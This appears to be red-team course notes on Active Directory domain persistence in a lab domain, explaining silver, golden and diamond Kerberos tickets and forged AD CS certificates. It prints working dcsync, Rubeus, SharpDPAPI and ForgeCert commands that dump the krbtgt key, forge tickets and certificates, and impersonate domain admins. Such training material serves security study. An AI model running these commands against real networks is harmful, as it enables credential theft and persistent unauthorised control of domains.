# Domain Dominance 

Once an attacker achieves a very high level of privilege in the domain, such as Domain or Enterprise Admin, it's very difficult for a defending organisation to recover or even consider the forest as "clean" again.  Attackers with this access can extract credential material from the domain and use it to re-obtain DA-level access at any time.  The majority of these credentials are never changed, which grants practically unlimited access.

If you've ever seen this joke before, wellâ€¦ it's true.

"Keep calm and rebuild the forest"

# Silver Tickets

A "silver ticket" is a forged service ticket, signed using the secret material (RC4/AES keys) of a computer account.  You may forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence.  By default, computer passwords change every 30 days, at which time you must re-obtain the new secrets to continue making silver tickets.  Both silver and golden (coming up next) tickets are forged, so can be generated on your own machine and imported into your Beacon session for use.
Let's say we dumped Kerberos keys from Workstation 1 from a SYSTEM Beacon.

# Golden Tickets

A "golden ticket" is a forged TGT, signed by the domain's krbtgt account.  Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine.  A golden ticket can be used to impersonate any user, to any service, on any machine in the domain; and to add insult to injury - the underlying credentials are never changed automatically.  For that reason, the krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently).
A common method for obtaining the krbtgt hash is to use dcsync from the context of a domain admin.

    dcsync dev.cyberbotic.io DEV\krbtgt

The ticket can be forged offline using Rubeus.

    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

And then imported into a logon session to use.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

    steal_token 5060
    run klist

    ls \\dc-2.dev.cyberbotic.io\c$

# Diamond Tickets

Like a golden ticket, a diamond ticket is a TGT which can be used to access any service as any user.  A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use.  Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.
Therefore, a possible tactic to detect the use of golden tickets is to look for TGS-REQs that have no corresponding AS-REQ.  A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it.  This overcomes the aforementioned shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.
First, we prove we have no access to the DC.

    getuid
    [*] You are DEV\bfarmer

    ls \\dc-2.dev.cyberbotic.io\c$

Diamond tickets can be created with Rubeus.    
    
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

where:

    /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
    /ticketuser is the username of the user to impersonate.
    /ticketuserid is the domain RID of that user.
    /groups are the desired group RIDs (512 being Domain Admins).
    /krbkey is the krbtgt AES256 hash.

Rubeus describe will now show that this is a TGT for the target user.

    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

# Forged Certificates

In larger organisations, the AD CS roles are installed on separate servers and not on the domain controllers themselves.  Often times, they are also not treated with the same sensitivity as DCs.  So, whereas only EAs and DAs can access/manage DCs, "lower level" roles such as server admins can access the CAs.  Although this can be seen a privilege escalation, it's just as useful as a domain persistence method.
Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT).  The default validity period for a CA private key is 5 years, but this can be set to any value during setup, sometimes as high as 10+ years.
Once on a CA, SharpDPAPI can extract the private keys.

    run hostname
    getuid
    
    execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

Save the private key and certificate to a .pem file and convert it to a .pfx with openssl.  Then, build the forged certificate with ForgeCert.

    PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

Even though you can specify any SubjectAltName, the user does need to be present in AD.  We can now use Rubeus to request a legitimate TGT with this forged certificate.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap

We're not limited to forging user certificates; we can do the same for machines.  Combine this with the S4U2self trick to gain access to any machine or service in the domain.
